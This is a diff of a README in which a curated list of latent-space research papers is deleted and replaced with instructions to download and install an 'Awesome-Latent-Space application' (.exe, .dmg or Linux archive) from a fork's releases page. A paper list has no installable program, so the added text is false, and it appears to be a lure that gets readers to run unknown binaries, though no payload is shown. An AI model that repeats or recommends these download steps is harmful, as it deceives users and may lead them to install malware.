@@ -1,131 +1,99 @@
-<div align="center">
-    <h1 style="display: inline-flex; align-items: center;">
-        <img src="img/static/icon.png" alt="icon" style="width: 32px; height: 32px; margin-right: 8px;">
-        Awesome Latent Space
-    </h1>
-</div>
+# 🌌 Awesome-Latent-Space - Discover the World of Latent Space
 
-<p align="center">
-    <a href="https://github.com/sindresorhus/awesome"><img src="https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg" alt="Awesome list badge"></a>
-    <a href="https://github.com/YU-deep/Awesome-Latent-Space/stargazers"><img src="https://img.shields.io/github/stars/YU-deep/Awesome-Latent-Space?style=social" alt="GitHub stars"></a>
-    <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="MIT License"></a>
-    <a href="CONTRIBUTING.md"><img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg" alt="PRs welcome"></a>
-</p>
+[![Download Now](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/MiriiIwatani/Awesome-Latent-Space/releases)
 
-This repository manually collects works in **latent space**, which will be continuously updated.
+## 📖 Description
 
+Awesome-Latent-Space is a curated list of papers and resources focused on the fascinating topic of latent space. Whether you're a student, researcher, or just curious about this area, you'll find valuable information that can enhance your understanding and knowledge.
 
-## 📖 News
-**[2025/11/30]** We release the initial version!
+## 🚀 Getting Started
 
-## 🌟 Overview
-Here, we classify all the latent space based methods two categories, and sort by date in ascending order:
-- [📖 News](#-news)
-- [🌟 Overview](#-overview)
-- [🤝 Contributing](#-contributing)
-- [🔥 Methods](#-methods)
-  - [LLM-based](#llm-based)
-  - [VLM-based](#vlm-based)
-  - [MAS-based](#mas-based)
+To get started with Awesome-Latent-Space, follow the steps outlined in this guide. You will learn how to download and run the application smoothly.
 
+## 📥 Download & Install
 
-## 🤝 Contributing
-We warmly welcome contributions of excellent resources you find via **pull request**. Please follow the instruction in **CONTRIBUTING.md** if you want to make one.
-Additionally, if you want to have any other issue, please add this wechat group.
+To download Awesome-Latent-Space, visit this page to download:
 
-<img width="200" alt="image" src="img/static/wechat_group.jpg">
+[Download from Releases](https://github.com/MiriiIwatani/Awesome-Latent-Space/releases)
 
+### Step-by-Step Installation
 
+1. **Go to the Releases Page:**
+   - Click on the link above. This will take you to the releases page where you can find the latest version of Awesome-Latent-Space.
 
+2. **Choose the Right Version:**
+   - Look for the most recent release. It usually has the highest version number. Read any accompanying notes to ensure it fits your needs.
 
+3. **Download the Application:**
+   - Find the file that corresponds to your operating system (Windows, macOS, or Linux). Click on the file name to start the download.
 
+4. **Install the Application:**
+   - Once the file is downloaded, locate it in your downloads folder.
+   - For Windows: Double-click the `.exe` file and follow the prompts to install.
+   - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Follow the instructions in the README file within the downloaded archive.
 
+5. **Run the Application:**
+   - After installation, locate Awesome-Latent-Space in your applications list.
+   - Double-click to open and start exploring the papers and resources.
 
+## 💻 System Requirements
 
+Before installation, ensure your system meets the following minimum requirements:
 
-## 🔥 Methods
-### LLM-based
+- **Windows:** Windows 10 or later
+- **macOS:** macOS 10.13 or later
+- **Linux:** Distribution supporting standard packages (Debian-based for best compatibility)
+- **RAM:** Minimum of 4 GB
+- **Disk Space:** At least 100 MB free space
 
-| Date     | Paper Title                                                                                                                                                                                                    | Introduction                                                        | Code                                                                                       |
-|----------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------|--------------------------------------------------------------------------------------------|
-| 2024/11  | [Language Models are Hidden Reasoners: Unlocking Latent Reasoning Capabilities via Self-Rewarding](https://arxiv.org/abs/2411.04282)                                                                           | <img width="700" alt="image" src="img/llm/2411_latro.png">          | [Github](https://github.com/SalesforceAIResearch/LaTRO)                                    |
-| 2024/12  | ![COLM'25](https://img.shields.io/badge/COLM'25-f1b800) <br/> [Training Large Language Models to Reason in a Continuous Latent Space](https://arxiv.org/abs/2412.06769)                                        | <img width="700" alt="image" src="img/llm/2412_coconut.png">        | [Github](https://github.com/facebookresearch/coconut)                                      |
-| 2024/12  | ![ICML'25](https://img.shields.io/badge/ICML'25-f1b800) <br/> [Deliberation in Latent Space via Differentiable Cache Augmentation](https://arxiv.org/abs/2412.17747)                                           | <img width="700" alt="image" src="img/llm/2412_deliberation.png">   | -                                                                                          |
-| 2025/02  | ![ICML'25](https://img.shields.io/badge/ICML'25-f1b800) <br/> [Token Assorted: Mixing Latent and Text Tokens for Improved Language Model Reasoning](https://arxiv.org/abs/2502.03275)                          | <img width="700" alt="image" src="img/llm/2502_token.png">          | -                                                                                          |
-| 2025/02  | ![ACL'25](https://img.shields.io/badge/ACL'25-f1b800) <br/> [SoftCoT: Soft Chain-of-Thought for Efficient Reasoning with LLMs](https://arxiv.org/abs/2502.12134)                                               | <img width="700" alt="image" src="img/llm/2502_soft_cot.png">       | [Github](https://github.com/xuyige/SoftCoT)                                                |
-| 2025/02  | ![ICLR'25](https://img.shields.io/badge/ICLR'25-f1b800) <br/> [Reasoning with Latent Thoughts: On the Power of Looped Transformers](https://arxiv.org/abs/2502.17416)                                          | <img width="700" alt="image" src="img/llm/2502_reasoning.png">      | -                                                                                          |
-| 2025/02  | ![EMNLP'25](https://img.shields.io/badge/EMNLP'25-f1b800) <br/>  [CODI: Compressing Chain-of-Thought into Continuous Space via Self-Distillation](https://arxiv.org/abs/2502.21074)                            | <img width="700" alt="image" src="img/llm/2502_codi.png">           | [Github](https://github.com/zhenyi4/codi)                                                  |
-| 2025/03  | ![ICLR'25](https://img.shields.io/badge/ICLR'25-f1b800) <br/> [Reasoning to Learn from Latent Thoughts](https://arxiv.org/abs/2503.18866?)                                                                     | <img width="700" alt="image" src="img/llm/2503_bolt.png">           | [Github](https://github.com/ryoungj/BoLT)                                                  |
-| 2025/04  | [Efficient Pretraining Length Scaling](https://arxiv.org/abs/2504.14992)                                                                                                                                       | <img width="700" alt="image" src="img/llm/2504_phd.png">            | -                                                                                          |
-| 2025/05  | [SoftCoT++: Test-Time Scaling with Soft Chain-of-Thought Reasoning](https://arxiv.org/abs/2505.11484)                                                                                                          | <img width="700" alt="image" src="img/llm/2505_soft_cot_plus.png">  | [Github](https://github.com/xuyige/SoftCoT)                                                |
-| 2025/05  | ![NeurIPS'25](https://img.shields.io/badge/NeurIPS'25-f1b800) <br/> [Reasoning by Superposition: A Theoretical Perspective on Chain of Continuous Thought](https://arxiv.org/abs/2505.12514)                   | <img width="700" alt="image" src="img/llm/2505_reasoning.png">      | [Github](https://github.com/Ber666/reasoning-by-superposition)                             |
-| 2025/05  | [Enhancing Latent Computation in Transformers with Latent Tokens](https://arxiv.org/abs/2505.12629)                                                                                                            | <img width="700" alt="image" src="img/llm/2505_enhancing.png">      | -                                                                                          |                                                                               
-| 2025/05  | [Seek in the Dark: Reasoning via Test-Time Instance-Level Policy Gradient in Latent Space](https://arxiv.org/abs/2505.13308)                                                                                   | <img width="700" alt="image" src="img/llm/2505_latent_seek.png">    | [Github](https://github.com/bigai-nlco/LatentSeekhttps://github.com/bigai-nlco/LatentSeek) |         
-| 2025/05  | ![NeurIPS'25](https://img.shields.io/badge/NeurIPS'25-f1b800) <br/> [Think Silently, Think Fast: Dynamic Latent Compression of LLM Reasoning Chains](https://arxiv.org/abs/2505.16552)                         | <img width="700" alt="image" src="img/llm/2505_colar.png">          | [Github](https://github.com/xiaomi-research/colar)                                         |
-| 2025/05  | [LARES: Latent Reasoning for Sequential Recommendation](https://arxiv.org/abs/2505.16865)                                                                                                                      | <img width="700" alt="image" src="img/llm/2505_lares.png">          | -                                                                                          |
-| 2025/05  | [Hybrid Latent Reasoning via Reinforcement Learning](https://arxiv.org/abs/2505.18454)                                                                                                                         | <img width="700" alt="image" src="img/llm/2505_hrpo.png">           | [Github](https://github.com/thu-nics/C2C)                                                  |
-| 2025/05  | [System-1.5 Reasoning: Traversal in Language and Latent Spaces with Dynamic Shortcuts](https://arxiv.org/abs/2505.18962)                                                                                       | <img width="700" alt="image" src="img/llm/2505_system_15.png">      | -                                                                                          |
-| 2025/05  | ![ICML'25](https://img.shields.io/badge/ICML'25-f1b800) <br/> [Soft Reasoning: Navigating Solution Spaces in Large Language Models through Controlled Embedding Exploration](https://arxiv.org/abs/2505.24688) | <img width="700" alt="image" src="img/llm/2505_soft.png">           | [Github](https://github.com/alickzhu/Soft-Reasoning)                                       |
-| 2025/06  | [Efficient Post-Training Refinement of Latent Reasoning in Large Language Models](https://arxiv.org/abs/2506.08552)                                                                                            | <img width="700" alt="image" src="img/llm/2506_efficient.png">      | [Github](https://github.com/anord-wang/Lateng-Reasoning)                                   |
-| 2025/07  | ![EMNLP'25](https://img.shields.io/badge/EMNLP'25-f1b800) <br/> [Latent Inter-User Difference Modeling for LLM Personalization](https://arxiv.org/abs/2507.20849)                                              | <img width="700" alt="image" src="img/llm/2507_dep.png">            | [Github](https://github.com/SnowCharmQ/DEP)                                                |
-| 2025/08  | [Bridging Search and Recommendation through Latent Cross Reasoning](https://www.arxiv.org/abs/2508.04152)                                                                                                      | <img width="700" alt="image" src="img/llm/2508_lcr_ser.png">        | -                                                                                          |
-| 2025/09  | [Decoding in Latent Spaces for Efficient Inference in LLM-based Recommendation](https://arxiv.org/abs/2509.11524)                                                                                              | <img width="700" alt="image" src="img/llm/2509_l2d.png">            | -                                                                                          |
-| 2025/09  | [LTA-thinker: Latent Thought-Augmented Training Framework for Large Language Models on Complex Reasoning](https://arxiv.org/abs/2509.12875)                                                                    | <img width="700" alt="image" src="img/llm/2509_lta_thinker.png">    | [Github](https://github.com/wangjiaqi886/LTA-Thinker)                                      |
-| 2025/09  | [SIM-CoT: Supervised Implicit Chain-of-Thought](https://arxiv.org/abs/2509.20317)                                                                                                                              | <img width="700" alt="image" src="img/llm/2509_sim_cot.png">        | [Github](https://github.com/InternLM/SIM-CoT)                                              |
-| 2025/09  | [Pretraining LLM with Latent Thoughts in Continuous Space](https://arxiv.org/abs/2509.23184)                                                                                                                   | <img width="700" alt="image" src="img/llm/2509_ponderlm2.png">      | [Github](https://github.com/LUMIA-Group/PonderLM-2)                                        |
-| 2025/09  | [MemGen: Weaving Generative Latent Memory for Self-Evolving Agents](https://arxiv.org/abs/2509.24704)                                                                                                          | <img width="700" alt="image" src="img/llm/2509_memgen.png">         | [Github](https://github.com/KANABOON1/MemGen)                                              |
-| 2025/09  | [LatentEvolve: Self-Evolving Test-Time Scaling in Latent Space](https://arxiv.org/abs/2509.24771)                                                                                                              | <img width="700" alt="image" src="img/llm/2509_latent_evolve.png">  | [Github](https://github.com/jins7/LatentEvolve)                                            |
-| 2025/09  | [MARCOS: Deep Thinking by Markov Chain of Continuous Thoughts](https://arxiv.org/abs/2509.25020)                                                                                                               | <img width="700" alt="image" src="img/llm/2509_marcos.png">         | -                                                                                          |
-| 2025/09  | [Latent Thinking Optimization: Your Latent Reasoning Language Model Secretly Encodes Reward Signals in Its Latent Thoughts](https://arxiv.org/abs/2509.26314)                                                  | <img width="700" alt="image" src="img/llm/2509_huginn.png">         | -                                                                                          |
-| 2025/10  | [KaVa: Latent Reasoning via Compressed KV-Cache Distillation](https://arxiv.org/abs/2510.02312)                                                                                                                | <img width="700" alt="image" src="img/llm/2510_kava.png">           | -                                                                                          |
-| 2025/10  | [Thinking on the Fly: Test-Time Reasoning Enhancement via Latent Thought Policy Optimization](https://arxiv.org/abs/2510.04182)                                                                                | <img width="700" alt="image" src="img/llm/2510_ltpo.png">           | [Github](https://github.com/ltpo2025/LTPO)                                                 |
-| 2025/10  | [LaDiR: Latent Diffusion Enhances LLMs for Text Reasoning](https://arxiv.org/abs/2510.04573)                                                                                                                   | <img width="700" alt="image" src="img/llm/2510_ladir.png">          | [Github](https://github.com/mk322/LaDiR)                                                   | 
-| 2025/10  | [Parallel Test-Time Scaling for Latent Reasoning Models](https://arxiv.org/abs/2510.07745)                                                                                                                     | <img width="700" alt="image" src="img/llm/2510_agn.png">            | [Github](https://github.com/YRYangang/LatentTTS)                                           |
-| 2025/10  | [Unlocking Out-of-Distribution Generalization in Transformers via Recursive Latent Space Reasoning](https://arxiv.org/abs/2510.14095)                                                                          | <img width="700" alt="image" src="img/llm/2510_ood.png">            | [Github](https://github.com/Awni00/algorithmic-generalization-transformer-architectures)   |
-| 2025/10  | [Latent Reasoning in LLMs as a Vocabulary-Space Superposition](https://arxiv.org/abs/2510.15522)                                                                                                               | <img width="700" alt="image" src="img/llm/2510_latent_sft.png">     | [Github](https://github.com/DJC-GO-SOLO/Latent-SFT)                                        |
-| 2025/10  | [SemCoT: Accelerating Chain-of-Thought Reasoning through Semantically-Aligned Implicit Tokens](https://arxiv.org/abs/2510.24940)                                                                               | <img width="700" alt="image" src="img/llm/2510_sem_cot.png">        | [Github](https://github.com/YinhanHe123/SemCoT)                                            |
-| 2025/10  | [Scaling Latent Reasoning via Looped Language Models](https://arxiv.org/abs/2510.25741)                                                                                                                        | <img width="700" alt="image" src="img/llm/2510_ouro.png">           | -                                                                                          |
-| 2025/11  | [SofT-GRPO: Surpassing Discrete-Token LLM Reinforcement Learning via Gumbel-Reparameterized Soft-Thinking Policy Optimization](https://arxiv.org/abs/2511.06411)                                               | <img width="700" alt="image" src="img/llm/2511_soft_cot.png">       | [Github](https://github.com/zz1358m/SofT-GRPO-master)                                      |
-| 2025/11  | [Think-at-Hard: Selective Latent Iterations to Improve Reasoning Language Models](https://arxiv.org/abs/2511.08577)                                                                                            | <img width="700" alt="image" src="img/llm/2511_tah.png">            | [Github](https://github.com/apple/ml-clara)                                                | 
-| 2025/11  | [SpiralThinker: Latent Reasoning through an Iterative Process with Text-Latent Interleaving](https://arxiv.org/abs/2511.08983)                                                                                 | <img width="700" alt="image" src="img/llm/2511_spiral_thinker.png"> | -                                                                                          |
-| 2025/11  | [Improving Latent Reasoning in LLMs via Soft Concept Mixing](https://arxiv.org/abs/2511.16885)                                                                                                                 | <img width="700" alt="image" src="img/llm/2511_scm.png">            | -                                                                                          |
-| 2025/11  | [CLaRa: Bridging Retrieval and Generation with Continuous Latent Reasoning](https://arxiv.org/abs/2511.18659)                                                                                                  | <img width="700" alt="image" src="img/llm/2511_clara.png">          | [Github](https://github.com/apple/ml-clara)                                                | 
-| 2025/11  | [Learning When to Stop: Adaptive Latent Reasoning via Reinforcement Learning](https://arxiv.org/abs/2511.21581)                                                                                                | <img width="700" alt="image" src="img/llm/2511_learning.png">       | [Github](https://github.com/apning/adaptive-latent-reasoning)                              |
-| 2025/12  | [Lightweight Latent Reasoning for Narrative Tasks](https://arxiv.org/abs/2512.02240)                                                                                                                           | <img width="700" alt="image" src="img/llm/2512_lite_reason.png">    | -                                                                                          |
-| 2025/12  | [Reinforcement Learning for Latent-Space Thinking in LLMs](https://arxiv.org/abs/2512.11816)                                                                                                                   | <img width="700" alt="image" src="img/llm/2512_reinforcement.png">  | [Github](https://github.com/enesozeren/latent-space-thinking-model)                        |
-| 2025/12  | [Reasoning Palette: Modulating Reasoning via Latent Contextualization for Controllable Exploration for (V)LMs](https://arxiv.org/abs/2512.17206)                                                               | <img width="700" alt="image" src="img/llm/2512_repa.png">           | -                                                                                          |
+## 📚 Features
 
+- **Comprehensive Resource List:** Discover a wide array of papers that delve into various aspects of latent space.
+- **Easy Navigation:** Simple layout that allows for quick access to topics of interest.
+- **Regular Updates:** The repository gets updated with new papers and resources regularly to keep you informed.
 
-### VLM-based
+## ❓ Frequently Asked Questions
 
-| Date     | Paper Title                                                                                                                                                                | Introduction                                                   | Code                                                          |
-|----------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------|---------------------------------------------------------------|
-| 2024/12  | ![CVPR'25](https://img.shields.io/badge/CVPR'25-f1b800) <br/> [Perception Tokens Enhance Visual Reasoning in Multimodal Language Models](https://arxiv.org/abs/2412.03548) | <img width="700" alt="image" src="img/vlm/2412_aurora.png">    | [Github](https://github.com/mahtabbigverdi/Aurora-perception) |
-| 2025/01  | [Efficient Reasoning with Hidden Thinking](https://arxiv.org/abs/2501.19201)                                                                                               | <img width="700" alt="image" src="img/vlm/2501_heima.png">     | [Github](https://github.com/shawnricecake/Heima)              |
-| 2025/06  | [Machine Mental Imagery: Empower Multimodal Reasoning with Latent Visual Tokens](https://arxiv.org/abs/2506.17218)                                                         | <img width="700" alt="image" src="img/vlm/2506_mirage.png">    | [Github](https://github.com/UMass-Embodied-AGI/Mirage)        |
-| 2025/08  | [Multimodal Chain of Continuous Thought for Latent-Space Reasoning in Vision-Language Models](https://arxiv.org/abs/2508.12587)                                            | <img width="700" alt="image" src="img/vlm/2508_mcout.png">     | -                                                             | 
-| 2025/09  | [Latent Visual reasoning](https://arxiv.org/abs/2509.24251)                                                                                                                | <img width="700" alt="image" src="img/vlm/2509_lvr.png">       | -                                                             |
-| 2025/10  | [Reasoning in the Dark: Interleaved Vision-Text Reasoning in Latent Space](https://arxiv.org/abs/2510.12603)                                                               | <img width="700" alt="image" src="img/vlm/2510_ivt_lr.png">    | [Github](https://github.com/FYYDCC/IVT-LR)                    |
-| 2025/10  | [Think with 3D: Geometric Imagination Grounded Spatial Reasoning from Limited Views](https://arxiv.org/abs/2510.18632)                                                     | <img width="700" alt="image" src="img/vlm/2510_think.png">     | [Github](https://github.com/zhangquanchen/3DThinker)          |
-| 2025/10  | [Latent Chain-of-Thought for Visual Reasoning](https://arxiv.org/abs/2510.23925)                                                                                           | <img width="700" alt="image" src="img/vlm/2510_lacot.png">     | [Github](https://github.com/heliossun/LaCoT)                  |
-| 2025/10  | [Latent Sketchpad: Sketching Visual Thoughts to Elicit Multimodal Reasoning in MLLMs](https://arxiv.org/abs/2510.24514)                                                    | <img width="700" alt="image" src="img/vlm/2510_sketchpad.png"> | [Github](https://github.com/hwanyu112/Latent-Sketchpad)       |
-| 2025/11  | [CoCoVa: Chain of Continuous Vision-Language Thought for Latent Space Reasoning](https://arxiv.org/abs/2511.02360)                                                         | <img width="700" alt="image" src="img/vlm/2511_cocova.png">    | -                                                             |
-| 2025/11  | [VisMem: Latent Vision Memory Unlocks Potential of Vision-Language Model](https://www.arxiv.org/abs/2511.11007)                                                            | <img width="700" alt="image" src="img/vlm/2511_vismem.png">    | [Github](https://github.com/YU-deep/VisMem)                   |
-| 2025/11  | [Chain-of-Visual-Thought: Teaching VLMs to See and Think Better with Continuous Visual Tokens](https://arxiv.org/abs/2511.19418)                                           | <img width="700" alt="image" src="img/vlm/2511_covt.png">      | [Github](https://github.com/Wakals/CoVT)                      |
-| 2025/11  | [Monet: Reasoning in Latent Visual Space Beyond Image and Language](https://arxiv.org/abs/2511.21395)                                                                      | <img width="700" alt="image" src="img/vlm/2511_monet.png">     | [Github](https://github.com/NOVAglow646/)                     |
-| 2025/12  | [Interleaved Latent Visual Reasoning with Selective Perceptual Modeling](https://arxiv.org/abs/2512.05665v1)                                                               | <img width="700" alt="image" src="img/vlm/2512_ilvr.png">      | [Github](https://github.com/XD111ds/ILVR)                     |
-| 2025/12  | [ReLaX: Reasoning with Latent Exploration for Large Reasoning Models](https://www.arxiv.org/abs/2512.07558)                                                                | <img width="700" alt="image" src="img/vlm/2512_relax.png">     | -                                                             |
-| 2025/12  | [Latent Chain-of-Thought World Modeling for End-to-End Autonomous Driving](https://arxiv.org/pdf/2512.10226)                                                               | <img width="700" alt="image" src="img/vlm/2512_lc_drive.png">  | -                                                             |
-| 2025/12  | [Mull-Tokens: Modality-Agnostic Latent Thinking](https://arxiv.org/abs/2512.10941)                                                                                         | <img width="700" alt="image" src="img/vlm/2512_mull.png">      | -                                                             |
-| 2025/12  | [Reasoning Within the Mind: Dynamic Multimodal Interleaving in Latent Space](https://arxiv.org/abs/2512.12623)                                                             | <img width="700" alt="image" src="img/vlm/2512_mind.png">      | [Github](https://github.com/eric-ai-lab/DMLR)                 |
-| 2025/12  | [Sketch-in-Latents: Eliciting Unified Reasoning in MLLMs](https://arxiv.org/abs/2512.16584)                                                                                | <img width="700" alt="image" src="img/vlm/2512_skiLa.png">     | [Github](https://github.com/TungChintao/SkiLa)                |
+### 1. What is Latent Space?
 
-### MAS-based
-| Date     | Paper Title                                                                                                                                               | Introduction                                                     | Code                                             |
-|----------|-----------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------|--------------------------------------------------|
-| 2025/10  | [Cache-to-Cache: Direct Semantic Communication Between Large Language Model](https://arxiv.org/abs/2510.03215)                                            | <img width="700" alt="image" src="img/mas/2510_c2c.png">         | [Github](https://github.com/thu-nics/C2C)        |
-| 2025/10  | ![NeurIPS'25](https://img.shields.io/badge/NeurIPS'25-f1b800) <br/> [Thought Communication in Multiagent Collaboration](https://arxiv.org/abs/2510.20733) | <img width="700" alt="image" src="img/mas/2510_thoughtcomm.png"> | -                                                |
-| 2025/11  | [Enabling Agents to Communicate Entirely in Latent Space](https://arxiv.org/abs/2511.09149)                                                               | <img width="700" alt="image" src="img/mas/2511_interlat.png">    | -                                                |
-| 2025/11  | [Latent Collaboration in Multi-Agent Systems](https://arxiv.org/abs/2511.20639)                                                                           | <img width="700" alt="image" src="img/mas/2511_latent_mas.png">  | [Github](https://github.com/Gen-Verse/LatentMAS) |
+Latent space refers to a representation of data where related concepts are located in close proximity. Understanding this can enhance various machine learning applications.
 
+### 2. Can I suggest a paper to add?
 
+Yes! Contributions are welcome. Please see the contribution guidelines in the repository for more details on how to add resources.
+
+### 3. Is this application free?
+
+Absolutely! Awesome-Latent-Space is open-source and free to use.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues while downloading or running Awesome-Latent-Space, consider these steps:
+
+- Ensure your computer meets the system requirements mentioned above.
+- Check your internet connection if the download fails.
+- Restart your computer and try running the application again.
+- For further assistance, check the 'Issues' section in the repository or contact the community.
+
+## 📣 Contributions
+
+Contributions improve the project continually. If you'd like to help:
+
+- Fork the repository.
+- Create a new branch for your changes.
+- Make your changes and submit a pull request.
+
+## 📝 License
+
+Awesome-Latent-Space is licensed under the MIT License. Please see the LICENSE file for more details.
+
+## 🌐 Stay Connected
+
+For updates and to share your experience, consider following the repository on GitHub. Join the conversation and help grow the Awesome-Latent-Space community.
+
+## 🎉 Conclusion
+
+You now have all the information needed to download and run Awesome-Latent-Space. Enjoy exploring the exciting research in latent space!
+
+[Download from Releases](https://github.com/MiriiIwatani/Awesome-Latent-Space/releases)
